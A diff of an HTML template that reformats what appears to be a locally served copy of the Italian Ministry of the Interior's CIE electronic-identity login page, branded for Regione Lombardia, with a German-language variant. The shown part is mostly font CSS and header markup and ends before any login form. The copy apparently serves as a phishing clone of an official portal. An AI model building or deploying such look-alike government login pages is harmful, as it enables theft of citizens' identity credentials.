@@ -1,660 +1,802 @@
 <!DOCTYPE html>
-<html class="h-100" lang="de"><head>
-<meta http-equiv="content-type" content="text/html; charset=UTF-8">
-		<title>CIE Login</title>
-		
+<html class="h-100" lang="de">
 
-<meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1.0">
-
-<meta http-equiv="X-UA-Compatible" content="IE=Edge">
-
-<link rel="stylesheet" href="{{ url_for('static', filename='login_cie_deu/bootstrap-italia.min.css') }}">
-<link rel="stylesheet" href="{{ url_for('static', filename='login_cie_deu/l12.css') }}">
-
-<link rel="apple-touch-icon" sizes="57x57" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-57x57.png">
-<link rel="apple-touch-icon" sizes="60x60" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-60x60.png">
-<link rel="apple-touch-icon" sizes="72x72" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-72x72.png">
-<link rel="apple-touch-icon" sizes="76x76" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-76x76.png">
-<link rel="apple-touch-icon" sizes="114x114" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-114x114.png">
-<link rel="apple-touch-icon" sizes="120x120" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-120x120.png">
-<link rel="apple-touch-icon" sizes="144x144" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-144x144.png">
-<link rel="apple-touch-icon" sizes="152x152" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-152x152.png">
-<link rel="apple-touch-icon" sizes="180x180" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-180x180.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/favicon-32x32.png">
-<link rel="icon" type="image/png" sizes="192x192" href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/android-chrome-192x192.png">
-
-<script src="{{ url_for('static', filename='login_cie_deu/bootstrap-italia.bundle.min.js') }}"></script><style>
-/* Titillium+Web:300,400,600,700 */
-
-/* latin-ext */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 300;
-  src: local('Titillium Web Light'), local('TitilliumWeb-Light'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 300;
-  src: local('Titillium Web Light'), local('TitilliumWeb-Light'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-/* latin-ext */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Titillium Web Regular'), local('TitilliumWeb-Regular'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Titillium Web Regular'), local('TitilliumWeb-Regular'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-/* latin-ext */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 600;
-  src: local('Titillium Web SemiBold'), local('TitilliumWeb-SemiBold'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 600;
-  src: local('Titillium Web SemiBold'), local('TitilliumWeb-SemiBold'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-/* latin-ext */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 700;
-  src: local('Titillium Web Bold'), local('TitilliumWeb-Bold'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Titillium Web';
-  font-style: normal;
-  font-weight: 700;
-  src: local('Titillium Web Bold'), local('TitilliumWeb-Bold'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff2) format('woff2'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff) format('woff'),
-  url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-
-/* Lora:400,700 */
-
-/* latin-ext */
-@font-face {
-  font-family: 'Lora';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Lora Regular'), local('Lora-Regular'),
-  url(/idp/fonts/Lora/Lora-Regular.woff2) format('woff2'),
-  url(/idp/fonts/Lora/Lora-Regular.woff) format('woff'),
-  url(/idp/fonts/Lora/Lora-Regular.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Lora';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Lora Regular'), local('Lora-Regular'),
-  url(/idp/fonts/Lora/Lora-Regular.woff2) format('woff2'),
-  url(/idp/fonts/Lora/Lora-Regular.woff) format('woff'),
-  url(/idp/fonts/Lora/Lora-Regular.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-/* latin-ext */
-@font-face {
-  font-family: 'Lora';
-  font-style: normal;
-  font-weight: 700;
-  src: local('Lora Bold'), local('Lora-Bold'),
-  url(/idp/fonts/Lora/Lora-Bold.woff2) format('woff2'),
-  url(/idp/fonts/Lora/Lora-Bold.woff) format('woff'),
-  url(/idp/fonts/Lora/Lora-Bold.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Lora';
-  font-style: normal;
-  font-weight: 700;
-  src: local('Lora Bold'), local('Lora-Bold'),
-  url(/idp/fonts/Lora/Lora-Bold.woff2) format('woff2'),
-  url(/idp/fonts/Lora/Lora-Bold.woff) format('woff'),
-  url(/idp/fonts/Lora/Lora-Bold.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-
-/* Roboto+Mono:400,700 */
-
-/* latin-ext */
-@font-face {
-  font-family: 'Roboto Mono';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Roboto Mono'), local('RobotoMono-Regular'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff2) format('woff2'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff) format('woff'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Roboto Mono';
-  font-style: normal;
-  font-weight: 400;
-  src: local('Roboto Mono'), local('RobotoMono-Regular'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff2) format('woff2'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff) format('woff'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-/* latin-ext */
-@font-face {
-  font-family: 'Roboto Mono';
-  font-style: normal;
-  font-weight: 700;
-  src: local('Roboto Mono Bold'), local('RobotoMono-Bold'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff2) format('woff2'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff) format('woff'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.ttf) format('truetype');
-  unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
-}
-/* latin */
-@font-face {
-  font-family: 'Roboto Mono';
-  font-style: normal;
-  font-weight: 700;
-  src: local('Roboto Mono Bold'), local('RobotoMono-Bold'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff2) format('woff2'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff) format('woff'),
-  url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.ttf) format('truetype');
-  unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
-}
-</style>
-<script src="{{ url_for('static', filename='login_cie_deu/l12.js.jsp') }}"></script>
-
-<script src="{{ url_for('static', filename='login_cie_deu/is.js') }}"></script>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
+    <title>CIE Login</title>
 
 
-	</head>
-	<body class="d-flex flex-column h-100">
-		<!-- header -->
-<div id="wrapperL12-header" class="it-header-wrapper ipzs-bb py-2">
-	<div class="it-header-slim-wrapper">
-		<div class="container"> 
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0">
 
-			<div class="row it-header-slim-wrapper-content ">
-				<div class="col">
-					<img src="{{ url_for('static', filename='login_cie_deu/ministero@2x.png') }}" alt="Ministero dell'Interno">
-				</div>
-				
-				<div class="col-1 text-right">
-					
-						
-<!-- lang -->
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
 
-<div class="it-header-slim-right-zone">
-	<div class="menu-wrapper" id="switchLang">
-		<ul class="navbar-nav">
-			<li class="nav-item dropdown">
+    <link rel="stylesheet" href="{{ url_for('static', filename='login_cie_deu/bootstrap-italia.min.css') }}">
+    <link rel="stylesheet" href="{{ url_for('static', filename='login_cie_deu/l12.css') }}">
 
-				<a class="nav-link dropdown-toggle" href="#" role="button" id="eccLangNavDropdown" data-toggle="dropdown" aria-expanded="false" aria-haspopup="true">
-					<span class="sr-only">Selezione lingua: lingua selezionata</span>
-					<span> DEU </span>
-                    <svg class="icon-expand icon icon-xs">
-                        <use href="{{ url_for('static', filename='login_cie/sprite.svg') }}#it-expand"></use>
-                    </svg>
-				</a>
+    <link rel="apple-touch-icon" sizes="57x57"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/apple-touch-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="32x32"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="192x192"
+        href="https://idserver.servizicie.interno.gov.it/idp/images/favicon/android-chrome-192x192.png">
 
-				<div class="dropdown-menu" role="region" aria-labelledby="eccLangNavDropdown">
-					<div class="link-list-wrapper">
-						<ul class="link-list">
-                            <li><a id="switch2it" class="dropdown-item list-item current" href="{{ url_for('login_cie') }}"><span>ITA <span class="sr-only">selezionata</span></span></a></li>
-							<li><a id="switch2de" class="dropdown-item list-item" href="{{ url_for('login_cie', lang = 'deu') }}"><span>DEU </span></a></li>
-						</ul>
-					</div>
-				</div>
-			  
-			</li>
-		</ul>
-	</div>
-</div>
+    <script src="{{ url_for('static', filename='login_cie_deu/bootstrap-italia.bundle.min.js') }}"></script>
+    <style>
+        /* Titillium+Web:300,400,600,700 */
 
-<!-- /lang -->
+        /* latin-ext */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 300;
+            src: local('Titillium Web Light'), local('TitilliumWeb-Light'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
 
-					
-				</div>
-				
-				<div class="col-4 col-lg-1 text-right">
-					<img src="{{ url_for('static', filename='login_cie_deu/CIE.png') }}" alt="Carta d'identita' elettronica">
-				</div>
-			</div>
-					
-		</div>
-	</div>
-</div>
-<!-- /header -->
+        /* latin */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 300;
+            src: local('Titillium Web Light'), local('TitilliumWeb-Light'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Light.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
 
-		<div id="wrapperL12">
-			<div class="container my-4">
+        /* latin-ext */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Titillium Web Regular'), local('TitilliumWeb-Regular'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
 
-				
+        /* latin */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Titillium Web Regular'), local('TitilliumWeb-Regular'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Regular.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+
+        /* latin-ext */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 600;
+            src: local('Titillium Web SemiBold'), local('TitilliumWeb-SemiBold'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
+
+        /* latin */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 600;
+            src: local('Titillium Web SemiBold'), local('TitilliumWeb-SemiBold'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-SemiBold.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+
+        /* latin-ext */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Titillium Web Bold'), local('TitilliumWeb-Bold'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
+
+        /* latin */
+        @font-face {
+            font-family: 'Titillium Web';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Titillium Web Bold'), local('TitilliumWeb-Bold'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff2) format('woff2'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.woff) format('woff'),
+                url(/idp/fonts/Titillium_Web/TitilliumWeb-Bold.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+
+        /* Lora:400,700 */
+
+        /* latin-ext */
+        @font-face {
+            font-family: 'Lora';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Lora Regular'), local('Lora-Regular'),
+                url(/idp/fonts/Lora/Lora-Regular.woff2) format('woff2'),
+                url(/idp/fonts/Lora/Lora-Regular.woff) format('woff'),
+                url(/idp/fonts/Lora/Lora-Regular.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
+
+        /* latin */
+        @font-face {
+            font-family: 'Lora';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Lora Regular'), local('Lora-Regular'),
+                url(/idp/fonts/Lora/Lora-Regular.woff2) format('woff2'),
+                url(/idp/fonts/Lora/Lora-Regular.woff) format('woff'),
+                url(/idp/fonts/Lora/Lora-Regular.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+
+        /* latin-ext */
+        @font-face {
+            font-family: 'Lora';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Lora Bold'), local('Lora-Bold'),
+                url(/idp/fonts/Lora/Lora-Bold.woff2) format('woff2'),
+                url(/idp/fonts/Lora/Lora-Bold.woff) format('woff'),
+                url(/idp/fonts/Lora/Lora-Bold.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
+
+        /* latin */
+        @font-face {
+            font-family: 'Lora';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Lora Bold'), local('Lora-Bold'),
+                url(/idp/fonts/Lora/Lora-Bold.woff2) format('woff2'),
+                url(/idp/fonts/Lora/Lora-Bold.woff) format('woff'),
+                url(/idp/fonts/Lora/Lora-Bold.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+
+        /* Roboto+Mono:400,700 */
+
+        /* latin-ext */
+        @font-face {
+            font-family: 'Roboto Mono';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Roboto Mono'), local('RobotoMono-Regular'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff2) format('woff2'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff) format('woff'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
+
+        /* latin */
+        @font-face {
+            font-family: 'Roboto Mono';
+            font-style: normal;
+            font-weight: 400;
+            src: local('Roboto Mono'), local('RobotoMono-Regular'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff2) format('woff2'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.woff) format('woff'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Regular.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+
+        /* latin-ext */
+        @font-face {
+            font-family: 'Roboto Mono';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Roboto Mono Bold'), local('RobotoMono-Bold'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff2) format('woff2'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff) format('woff'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.ttf) format('truetype');
+            unicode-range: U+0100-024F, U+0259, U+1E00-1EFF, U+2020, U+20A0-20AB, U+20AD-20CF, U+2113, U+2C60-2C7F, U+A720-A7FF;
+        }
+
+        /* latin */
+        @font-face {
+            font-family: 'Roboto Mono';
+            font-style: normal;
+            font-weight: 700;
+            src: local('Roboto Mono Bold'), local('RobotoMono-Bold'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff2) format('woff2'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.woff) format('woff'),
+                url(/idp/fonts/Roboto_Mono/RobotoMono-Bold.ttf) format('truetype');
+            unicode-range: U+0000-00FF, U+0131, U+0152-0153, U+02BB-02BC, U+02C6, U+02DA, U+02DC, U+2000-206F, U+2074, U+20AC, U+2122, U+2191, U+2193, U+2212, U+2215, U+FEFF, U+FFFD;
+        }
+    </style>
+    <script src="{{ url_for('static', filename='login_cie_deu/l12.js.jsp') }}"></script>
+
+    <script src="{{ url_for('static', filename='login_cie_deu/is.js') }}"></script>
 
 
+</head>
 
-<div class="row">
-	<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-	<div class="col">
-		<div class="row">
-			<div id="title" class="mb-4 col">
-				<p class="c1">
-					<strong>
-						ANFRAGE EINSTIEG CIE
-						
-							STUFE 2
-						
-					</strong>
-				</p>
-				<h1>Regione Lombardia</h1>	
-			</div>
-		</div>
-	</div>
-	<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-</div>
+<body class="d-flex flex-column h-100">
+    <!-- header -->
+    <div id="wrapperL12-header" class="it-header-wrapper ipzs-bb py-2">
+        <div class="it-header-slim-wrapper">
+            <div class="container">
 
-				
-				<div class="row">
-					<div class="col-1 col-md-2 col-lg-1 d-none d-sm-flex"></div>
-					<div class="col mx-0 mx-sm-n4">
-						
-							<div class="card-wrapper card-space">
-								<div class="card card-bg card-bg-small-none card-big py-0 mx-0 mx-md-1">
-									<div class="card-body p-0 p-sm-4">
+                <div class="row it-header-slim-wrapper-content ">
+                    <div class="col">
+                        <img src="{{ url_for('static', filename='login_cie_deu/ministero@2x.png') }}"
+                            alt="Ministero dell'Interno">
+                    </div>
 
-										<div class="row">
-											
-
-<div id="loginwithappcard" class="col-12 col-lg-6 pr-lg-4 d-none mb-5 p-0">
-	<!--start card-->
-	<div class="card card-teaser rounded border-left border-primary p-3">
-		<div class="card-body">
-			<div class="row align-items-center">
-				<div class="col-2 ml-3">
-					<img class="img-fluid" src="{{ url_for('static', filename='login_cie_deu/android1.jpg') }}" alt="CIE Logo">
-				</div>
-				<div class="col-9">
-					<h3 class="card-title font-weight-semibold c4">Hai l'app CieID?</h3>
-					<p>Accedi più velocemente</p>
-				</div>
-			</div>
-			<a href="https://ios.idserver.servizicie.interno.gov.it/idp/login/app?opId=_7e4bb538902a7e4282b9268b3a73246c_b7cf1246e7d5137f0effb1fb4dcfa74c&amp;challenge=OttfDtHebH%2BQFA%2B6xF8lAQ2LiR%2BOuymDgk8PLSg9&amp;level=2&amp;SPName=https%3A%2F%2Fidpcwrapper.crs.lombardia.it%2Fmetadata%2Fsp-metadata-cie.xml&amp;SPLogo=https%3A%2F%2Fidserver.servizicie.interno.gov.it%2Fidp%2Fimages%2Fcielogo.png&amp;value=e2s1" class="stretched-link"><span class="sr-only">Autorizza con l'App CieID</span></a>
-		</div>
-	</div>
-	<!--end card-->
-</div>
-
-<script>
-	$(document).ready(function() {
-		if( is.mobile() ){
-			//mostra loginwithappcard solo per dispositivi mobile
-			$("#loginwithappcard").removeClass("d-none");
-		}
-	});
-</script>
-											<div class="col-12 col-lg-6 pr-lg-4">
-												
+                    <div class="col-1 text-right">
 
 
-<h2>Anmelden mit Ihren Zugangsdaten CIE</h2>
+                        <!-- lang -->
 
+                        <div class="it-header-slim-right-zone">
+                            <div class="menu-wrapper" id="switchLang">
+                                <ul class="navbar-nav">
+                                    <li class="nav-item dropdown">
 
+                                        <a class="nav-link dropdown-toggle" href="#" role="button"
+                                            id="eccLangNavDropdown" data-toggle="dropdown" aria-expanded="false"
+                                            aria-haspopup="true">
